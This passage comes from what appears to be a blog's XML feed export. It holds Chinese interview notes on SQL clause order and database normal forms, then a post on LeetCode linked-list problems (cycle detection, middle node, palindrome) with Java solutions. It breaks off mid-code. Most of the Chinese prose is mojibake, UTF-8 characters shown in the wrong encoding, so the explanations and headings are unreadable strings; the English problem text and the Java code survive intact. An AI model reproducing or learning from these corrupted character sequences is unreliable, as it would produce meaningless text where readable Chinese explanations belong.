WHEREè¿‡æ»¤è¡Œï¼ŒHAVINGè¿‡æ»¤ç»„</p><p>Ã˜ å‡ºç°åœ¨åŒä¸€sqlçš„é¡ºåºï¼šWHERE-&gt;GROUP BY-&gt;HAVING</p><p><img src="/2020/03/23/database/clip_image012.png"></p><p><img src="/2020/03/23/database/clip_image013.png"></p><h4><span id="countsummaxminavg">COUNT,SUM,MAX,MIN,AVG</span></h4><h2><span id="ç†è®ºèŒƒå¼">ç†è®ºèŒƒå¼</span></h2><p><img src="/2020/03/23/database/clip_image015.jpg" alt="èŒƒå¼"></p><h3><span id="1nf">1NF</span></h3><p>æ˜¯æŒ‡åœ¨<a href="https://baike.baidu.com/item/%E5%85%B3%E7%B3%BB%E6%A8%A1%E5%9E%8B">å…³ç³»æ¨¡å‹</a>ä¸­ï¼Œå¯¹äºæ·»åŠ çš„ä¸€ä¸ªè§„èŒƒè¦æ±‚ï¼Œæ‰€æœ‰çš„åŸŸéƒ½åº”è¯¥æ˜¯åŸå­æ€§çš„ï¼Œå³æ•°æ®åº“è¡¨çš„æ¯ä¸€åˆ—éƒ½æ˜¯ä¸å¯åˆ†å‰²çš„åŸå­æ•°æ®é¡¹ï¼Œè€Œä¸èƒ½æ˜¯é›†åˆï¼Œæ•°ç»„ï¼Œè®°å½•ç­‰éåŸå­æ•°æ®é¡¹ã€‚å³å®ä½“ä¸­çš„æŸä¸ªå±æ€§æœ‰å¤šä¸ªå€¼æ—¶ï¼Œå¿…é¡»æ‹†åˆ†ä¸ºä¸åŒçš„å±æ€§ã€‚åœ¨ç¬¦åˆç¬¬ä¸€èŒƒå¼ï¼ˆ1NFï¼‰è¡¨ä¸­çš„æ¯ä¸ªåŸŸå€¼åªèƒ½æ˜¯å®ä½“çš„ä¸€ä¸ªå±æ€§æˆ–ä¸€ä¸ªå±æ€§çš„ä¸€éƒ¨åˆ†ã€‚ç®€è€Œè¨€ä¹‹ï¼Œ<strong>ç¬¬ä¸€èŒƒå¼å°±æ˜¯æ— é‡å¤çš„åŸŸ</strong>(**åŸå­é¡¹)**ã€‚</p><p>1NFæ˜¯å…³ç³»æ¨¡å¼åº”å…·å¤‡çš„æœ€èµ·ç çš„æ¡ä»¶ï¼Œå¦‚æœæ•°æ®åº“è®¾è®¡ä¸èƒ½æ»¡è¶³ç¬¬ä¸€èŒƒå¼ï¼Œå°±ä¸èƒ½ç§°ä¸ºå…³ç³»å‹æ•°æ®åº“ã€‚å…³ç³»æ•°æ®åº“è®¾è®¡ç ”ç©¶çš„å…³ç³»è§„èŒƒåŒ–æ˜¯åœ¨1NFä¹‹ä¸Šè¿›è¡Œçš„ã€‚</p><h3><span id="2nf">2NF</span></h3><p>ç¬¬äºŒèŒƒå¼è¦æ»¡è¶³çš„æ¡ä»¶ï¼š<font color="red">é¦–å…ˆè¦æ»¡è¶³ç¬¬ä¸€èŒƒå¼ï¼Œå…¶æ¬¡æ¯ä¸€ä¸ªéä¸»å±æ€§è¦å®Œå…¨å‡½æ•°ä¾èµ–äºå€™é€‰é”®ï¼Œæˆ–è€…æ˜¯ä¸»é”®ã€‚</font>ä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯ä¸ªéä¸»å±æ€§æ˜¯ç”±æ•´ä¸ªä¸»é”®å‡½æ•°å†³å®šçš„ï¼Œè€Œä¸èƒ½æœ‰ä¸»é”®çš„ä¸€éƒ¨åˆ†æ¥å†³å®šã€‚</p><h3><span id="3nf">3NF</span></h3><p>å¦‚æœå…³ç³»æ¨¡å¼Ræ˜¯2NFï¼Œä¸”å…³ç³»æ¨¡å¼Rï¼ˆU,Fï¼‰ä¸­çš„æ‰€æœ‰éä¸»å±æ€§å¯¹ä»»ä½•å€™é€‰å…³é”®å­—éƒ½ä¸å­˜åœ¨ä¼ é€’ä¾èµ–ï¼Œåˆ™ç§°å…³ç³»Ræ˜¯å±äºç¬¬ä¸‰èŒƒå¼ã€‚</p><p>ç¬¬ä¸‰èŒƒå¼ï¼ˆ3NFï¼‰ï¼›ç¬¦åˆ2NFï¼Œå¹¶ä¸”ï¼Œæ¶ˆé™¤ä¼ é€’ä¾èµ–ã€‚</p><h3><span id="å…¶å®ƒèŒƒå¼">å…¶å®ƒèŒƒå¼</span></h3><p>ç¬¬å››èŒƒå¼ï¼šè¦æ±‚æŠŠåŒä¸€è¡¨å†…çš„å¤šå¯¹å¤šå…³ç³»åˆ é™¤ã€‚</p><p>ç¬¬äº”èŒƒå¼ï¼šä»æœ€ç»ˆç»“æ„é‡æ–°å»ºç«‹åŸå§‹ç»“æ„ã€‚</p><p>BCèŒƒå¼ï¼ˆBCNFï¼‰ï¼šç¬¦åˆ3NFï¼Œå¹¶ä¸”ï¼Œä¸»å±æ€§ä¸ä¾èµ–äºä¸»å±æ€§ã€‚è‹¥å…³ç³»æ¨¡å¼Rå±äºç¬¬ä¸€èŒƒå¼ï¼Œä¸”æ¯ä¸ªå±æ€§éƒ½ä¸ä¼ é€’ä¾èµ–äºé”®ç ï¼Œåˆ™Rå±äºBCèŒƒå¼ã€‚</p><h3><span id="ä¼˜ç¼ºç‚¹">ä¼˜ç¼ºç‚¹</span></h3><p>è§„èŒƒåŒ–çš„ä¼˜ç‚¹æ˜¯æ˜æ˜¾çš„ï¼Œå®ƒé¿å…äº†å¤§é‡çš„æ•°æ®å†—ä½™ï¼ŒèŠ‚çœäº†å­˜å‚¨ç©ºé—´ï¼Œä¿æŒäº†æ•°æ®çš„ä¸€è‡´æ€§ã€‚å½“ä¸€ä¸ªåº“é‡Œçš„æ•°æ®ç»å¸¸å‘ç”Ÿå˜åŒ–æ—¶ï¼Œè¾¾åˆ°3NFçš„åº“å¯ä»¥ä½¿ç”¨æˆ·ä¸å¿…åœ¨è¶…è¿‡ä¸¤ä¸ªä»¥ä¸Šçš„åœ°æ–¹æ›´æ”¹åŒä¸€ä¸ªå€¼ã€‚é‚£ä¹ˆæ˜¯ä¸æ˜¯åªè¦æŠŠæ‰€æœ‰çš„è¡¨éƒ½è§„èŒƒä¸º3NFåï¼Œæ•°æ®åº“çš„è®¾è®¡å°±æ˜¯æœ€ä¼˜çš„å‘¢?è¿™å¯ä¸ä¸€å®šã€‚èŒƒå¼è¶Šé«˜æ„å‘³ç€è¡¨çš„åˆ’åˆ†æ›´ç»†ï¼Œä¸€ä¸ªæ•°æ®åº“ä¸­éœ€è¦çš„è¡¨ä¹Ÿå°±è¶Šå¤šï¼Œç”¨æˆ·ä¸å¾—ä¸å°†åŸæœ¬ç›¸å…³è”çš„æ•°æ®åˆ†æ‘Šåˆ°å¤šä¸ªè¡¨ä¸­ã€‚å½“ç”¨æˆ·åŒæ—¶éœ€è¦è¿™äº›æ•°æ®æ—¶åªèƒ½é‡‡ç”¨è¿æ¥è¡¨çš„å½¢å¼å°†æ•°æ®é‡æ–°åˆå¹¶åœ¨ä¸€èµ·ã€‚åŒæ—¶æŠŠå¤šä¸ªè¡¨è”æ¥åœ¨ä¸€èµ·çš„èŠ±è´¹æ˜¯å·¨å¤§çš„ï¼Œå°¤å…¶æ˜¯å½“éœ€è¦è¿æ¥çš„ä¸¤å¼ æˆ–è€…å¤šå¼ è¡¨æ•°æ®éå¸¸åºå¤§çš„æ—¶å€™ï¼Œè¡¨è¿æ¥æ“ä½œå‡ ä¹æ˜¯ä¸€ä¸ªå™©æ¢¦ï¼Œè¿™ä¸¥é‡åœ°é™ä½äº†ç³»ç»Ÿè¿è¡Œæ€§èƒ½</p><h2><span id="æ•°æ®åº“è¿æ¥">æ•°æ®åº“è¿æ¥</span></h2><p><img src="/2020/03/23/database/clip_image017.jpg" alt="æ•°æ®åº“è¿æ¥"></p><p><a href="https://blog.csdn.net/DarkAngel1228/article/details/80004222?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1">https://blog.csdn.net/DarkAngel1228/article/details/80004222?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1</a> ä¸»ä»</p>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•°æ®åº“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é“¾è¡¨ç²¾é€‰</title>
      <link href="/2020/03/22/LinkedList/"/>
      <url>/2020/03/22/LinkedList/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>æ‘˜å½•äº†ä¸€äº›ç»å…¸çš„é“¾è¡¨é¢˜ï¼Œä¸€å…±16é¢˜ã€‚</p><span id="more"></span><!-- toc --><ul><li><a href="#%E9%93%BE%E8%A1%A8">é“¾è¡¨</a></li><li><a href="#%E5%BF%AB%E6%85%A2%E6%8C%87%E9%92%88%E6%B3%95">å¿«æ…¢æŒ‡é’ˆæ³•</a><ul><li><a href="#141-linked-list-cycle">141. Linked List Cycle âˆš</a></li><li><a href="#142-linked-list-cycle-ii">142. Linked List Cycle II âˆš</a></li><li><a href="#876-middle-of-the-linked-list">876. Middle of the Linked List âˆš</a></li><li><a href="#234-palindrome-linked-list">234. Palindrome Linked List âˆš</a></li></ul></li><li><a href="#%E5%8F%8C%E6%8C%87%E9%92%88%E6%B3%95">åŒæŒ‡é’ˆæ³•</a><ul><li><a href="#203-remove-linked-list-elements">203. Remove Linked List Elements âˆš</a></li><li><a href="#160-intersection-of-two-linked-lists">160. Intersection of Two Linked Lists âˆš</a></li></ul></li><li><a href="#%E5%88%A0%E9%99%A4%E8%8A%82%E7%82%B9">åˆ é™¤èŠ‚ç‚¹</a><ul><li><a href="#19-remove-nth-node-from-end-of-list">19. Remove Nth Node From End of List âˆš</a></li><li><a href="#83-remove-duplicates-from-sorted-list">83. Remove Duplicates from Sorted List Ã—</a></li><li><a href="#82-remove-duplicates-from-sorted-list-ii">82. Remove Duplicates from Sorted List II Ã—</a></li></ul></li><li><a href="#%E5%9F%BA%E7%A1%80%E7%9A%84%E8%A7%A3%E6%B3%95">åŸºç¡€çš„è§£æ³•</a><ul><li><a href="#21merge-two-sorted-lists">21.Merge Two Sorted Lists âˆš</a></li><li><a href="#445-add-two-numbers-ii">445. Add Two Numbers II â€”</a></li><li><a href="#22-%E9%93%BE%E8%A1%A8%E4%B8%AD%E5%80%92%E6%95%B0%E7%AC%AC-k-%E4%B8%AA%E7%BB%93%E7%82%B9">22. é“¾è¡¨ä¸­å€’æ•°ç¬¬ K ä¸ªç»“ç‚¹ âˆš</a></li></ul></li><li><a href="#%E7%BF%BB%E8%BD%AC%E9%93%BE%E8%A1%A8">ç¿»è½¬é“¾è¡¨</a><ul><li><a href="#206-reverse-linked-list">206. Reverse Linked List âˆš</a></li><li><a href="#92-reverse-linked-list-ii">92. Reverse Linked List II âˆš</a></li><li><a href="#25-reverse-nodes-in-k-group">25. Reverse Nodes in k-Group âˆš</a></li></ul></li><li><a href="#%E8%BF%9B%E9%98%B6%E8%A7%A3%E6%B3%95">è¿›é˜¶è§£æ³•</a><ul><li><a href="#24-swap-nodes-in-pairs">24. Swap Nodes in Pairs Ã—</a></li><li><a href="#725-split-linked-list-in-parts">725. Split Linked List in Parts â€”</a></li><li><a href="#328-odd-even-linked-list">328. Odd Even Linked List Ã—</a></li><li><a href="#61-rotate-list">61. Rotate List âˆš</a></li><li><a href="#148-sort-list">148. Sort List Ã—</a></li><li><a href="#138-copy-list-with-random-pointer">138. Copy List with Random Pointer âˆš</a></li></ul></li></ul><!-- tocstop --><h1><span id="é“¾è¡¨">é“¾è¡¨</span></h1><p>å¸¸ç”¨æ–¹æ³•ï¼š</p><ul><li>æ–¹æ³•ä¸€ï¼šå…ˆnewä¸€ä¸ªæ–°çš„é“¾è¡¨ dummy ç„¶åä½¿å®ƒæŒ‡å‘é¢˜ç›®ä¸­çš„headèŠ‚ç‚¹ï¼Œè¿™æ ·èƒ½çœå»å¾ˆå¤šåˆ¤æ–­æ¡ä»¶ï¼Œä½¿å¾—ä»£ç æ›´å¥½å†™ã€‚æœ€åè¿”å› dummy.next å³å¯ã€‚</li><li>æ–¹æ³•äºŒï¼š å¿«æ…¢æŒ‡é’ˆæ³•ï¼Œå¿«æŒ‡é’ˆä¸€æ¬¡æ­¥è¿›2ï¼Œæ…¢æŒ‡é’ˆä¸€æ¬¡æ­¥è¿›1ã€‚</li><li>æ–¹æ³•ä¸‰ï¼šå°¾æ’æ³•ï¼Œå¯ä»¥åšå‡ºæ‰€æœ‰åå‘é“¾è¡¨çš„é¢˜ç›®ã€‚</li></ul><h1><span id="å¿«æ…¢æŒ‡é’ˆæ³•">å¿«æ…¢æŒ‡é’ˆæ³•</span></h1><h2><span id="141-linked-list-cycle">141. Linked List Cycle âˆš</span></h2><p>ç»™å®šä¸€ä¸ªé“¾è¡¨ï¼Œåˆ¤æ–­é“¾è¡¨ä¸­æ˜¯å¦æœ‰ç¯ã€‚<br>ä¸ºäº†è¡¨ç¤ºç»™å®šé“¾è¡¨ä¸­çš„ç¯ï¼Œæˆ‘ä»¬ä½¿ç”¨æ•´æ•° pos æ¥è¡¨ç¤ºé“¾è¡¨å°¾è¿æ¥åˆ°é“¾è¡¨ä¸­çš„ä½ç½®ï¼ˆç´¢å¼•ä» 0 å¼€å§‹ï¼‰ã€‚ å¦‚æœ pos æ˜¯ -1ï¼Œåˆ™åœ¨è¯¥é“¾è¡¨ä¸­æ²¡æœ‰ç¯ã€‚</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: head = [3,2,0,-4], pos = 1</span><br><span class="line">Output: true</span><br><span class="line">Explanation: There is a cycle in the linked list, where tail connects to the second node.</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/LinkedList/l1.png" alt="list-1"></p><ul><li>æ–¹æ³•ä¸€ï¼šHashSet<br><br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨HashSetçš„æ–¹æ³•å®ç°Oï¼ˆNï¼‰æ—¶é—´å¤æ‚åº¦ï¼ŒOï¼ˆNï¼‰ç©ºé—´å¤æ‚åº¦ã€‚<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        HashSet&lt;ListNode&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">set.add(head);</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">nextN</span> <span class="operator">=</span> head.next;</span><br><span class="line">            <span class="keyword">while</span>(nextN!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(set.contains(nextN))</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    set.add(nextN);</span><br><span class="line">                nextN=nextN.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>æ–¹æ³•äºŒï¼šFloydé¾Ÿå…”èµ›è·‘<br><br>æˆ‘ä»¬è·‘æ­¥çš„ä¾‹å­æ¥è§£é‡Šï¼Œå¦‚æœä¸¤ä¸ªäººåŒæ—¶å‡ºå‘ï¼Œå¦‚æœèµ›é“æœ‰ç¯ï¼Œé‚£ä¹ˆå¿«çš„ä¸€æ–¹æ€»èƒ½è¿½ä¸Šæ…¢çš„ä¸€æ–¹ã€‚è¿›ä¸€æ­¥æƒ³ï¼Œè¿½ä¸Šæ—¶å¿«çš„ä¸€æ–¹è‚¯å®šæ¯”æ…¢çš„ä¸€æ–¹å¤šè·‘äº†å‡ åœˆï¼Œå³å¤šè·‘çš„è·¯çš„é•¿åº¦æ˜¯åœˆçš„é•¿åº¦çš„å€æ•°ã€‚åŸºäºä¸Šé¢çš„æƒ³æ³•ï¼ŒFloydç”¨ä¸¤ä¸ªæŒ‡é’ˆï¼Œä¸€ä¸ªæ…¢æŒ‡é’ˆï¼ˆé¾Ÿï¼‰æ¯æ¬¡å‰è¿›ä¸€æ­¥ï¼Œå¿«æŒ‡é’ˆï¼ˆå…”ï¼‰æŒ‡é’ˆæ¯æ¬¡å‰è¿›ä¸¤æ­¥ï¼ˆä¸¤æ­¥æˆ–å¤šæ­¥æ•ˆæœæ—¶ç­‰ä»·çš„ï¼Œåªè¦ä¸€ä¸ªæ¯”å¦ä¸€ä¸ªå¿«å°±è¡Œï¼‰ã€‚å¦‚æœä¸¤è€…åœ¨é“¾è¡¨å¤´ä»¥å¤–çš„æŸä¸€ç‚¹ç›¸é‡ï¼ˆå³ç›¸ç­‰ï¼‰äº†ï¼Œé‚£ä¹ˆè¯´æ˜é“¾è¡¨æœ‰ç¯ï¼Œå¦åˆ™ï¼Œå¦‚æœï¼ˆå¿«æŒ‡é’ˆï¼‰åˆ°è¾¾äº†é“¾è¡¨çš„ç»“å°¾ï¼Œé‚£ä¹ˆè¯´æ˜æ²¡æœ‰ç¯ã€‚<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>||head.next==<span class="literal">null</span>)<span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//the initialized condition</span></span><br><span class="line">          <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">          <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">            <span class="keyword">while</span>(fast!=<span class="literal">null</span>&amp;&amp;fast.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">                slow=slow.next;</span><br><span class="line">                fast=fast.next.next;</span><br><span class="line">                <span class="keyword">if</span>(slow == fast)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>æé—®ï¼šæ—¶é—´å¤æ‚åº¦æ˜¯å¤šå°‘ï¼Ÿ</li></ul><h2><span id="142-linked-list-cycle-ii">142. Linked List Cycle II âˆš</span></h2><p>Given a linked list, return the node where the cycle begins. If there is no cycle, return <code>null</code>.</p><p>To represent a cycle in the given linked list, we use an integer <code>pos</code> which represents the position (0-indexed) in the linked list where tail connects to. If <code>pos</code> is <code>-1</code>, then there is no cycle in the linked list.</p><p><strong>Note:</strong> Do not modify the linked list. </p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: head = [3,2,0,-4], pos = 1</span><br><span class="line">Output: tail connects to node index 1</span><br><span class="line">Explanation: There is a cycle in the linked list, where tail connects to the second node.</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/LinkedList/image-20200322195454659.png" alt="Floyedé¾Ÿå…”èµ›è·‘"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">detectCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">int</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>||head.next==<span class="literal">null</span>)<span class="keyword">return</span>  <span class="literal">null</span>;        </span><br><span class="line">        <span class="keyword">while</span>(fast!=<span class="literal">null</span>&amp;&amp;fast.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">            fast=fast.next.next;</span><br><span class="line">            slow=slow.next;</span><br><span class="line">            <span class="keyword">if</span>(slow==fast)&#123;</span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">while</span>(head!=fast)&#123;</span><br><span class="line">                head=head.next;</span><br><span class="line">                fast=fast.next;</span><br><span class="line">                <span class="keyword">if</span>(fast==head)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> head;            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="876-middle-of-the-linked-list">876. Middle of the Linked List âˆš</span></h2><p>ç»™å®šä¸€ä¸ªå¸¦æœ‰å¤´ç»“ç‚¹ <code>head</code> çš„éç©ºå•é“¾è¡¨ï¼Œè¿”å›é“¾è¡¨çš„ä¸­é—´ç»“ç‚¹ã€‚</p><p>å¦‚æœæœ‰ä¸¤ä¸ªä¸­é—´ç»“ç‚¹ï¼Œåˆ™è¿”å›ç¬¬äºŒä¸ªä¸­é—´ç»“ç‚¹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">middleNode</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    ListNode slow=head;</span><br><span class="line">    ListNode fast=head;</span><br><span class="line">    <span class="keyword">while</span>(fast!=<span class="literal">null</span>&amp;&amp;fast.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">        fast=fast.next.next;</span><br><span class="line">        slow=slow.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="234-palindrome-linked-list">234. Palindrome Linked List âˆš</span></h2><p>Given a singly linked list, determine if it is a palindrome.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;2-&gt;1</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure><ul><li><p>ä½¿ç”¨æ ˆçš„è§£æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isPalindrome</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    Stack&lt;Integer&gt; s = <span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">    <span class="keyword">if</span>(head==<span class="literal">null</span>||head.next==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    ListNode fast=head,slow=head;</span><br><span class="line">    <span class="keyword">while</span> (fast!=<span class="literal">null</span>&amp;&amp;fast.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">        s.push(slow.val);</span><br><span class="line">        fast=fast.next.next;</span><br><span class="line">        slow=slow.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fast!=<span class="literal">null</span>) slow=slow.next;</span><br><span class="line">    <span class="keyword">return</span> isEqual(s,slow);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEqual</span><span class="params">(Stack&lt;Integer&gt; s,ListNode head)</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(!s.isEmpty()&amp;&amp;head!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s.pop()!=head.val) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        head=head.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ä¸ä½¿ç”¨é¢å¤–ç©ºé—´çš„è§£æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isPalindrome</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(head==<span class="literal">null</span>||head.next==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="type">boolean</span> flag=<span class="literal">false</span>;</span><br><span class="line">    ListNode fast=head,slow=head;</span><br><span class="line">    <span class="keyword">while</span> (fast!=<span class="literal">null</span>&amp;&amp;fast.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">        fast=fast.next.next;</span><br><span class="line">        slow=slow.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fast==<span class="literal">null</span>) flag=<span class="literal">true</span>;</span><br><span class="line">    cut(head,slow);</span><br><span class="line">    slow=flag==<span class="literal">true</span>?slow:slow.next;</span><br><span class="line">    <span class="keyword">return</span> isEqual(head,reverse(slow));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isEqual</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (l1!=<span 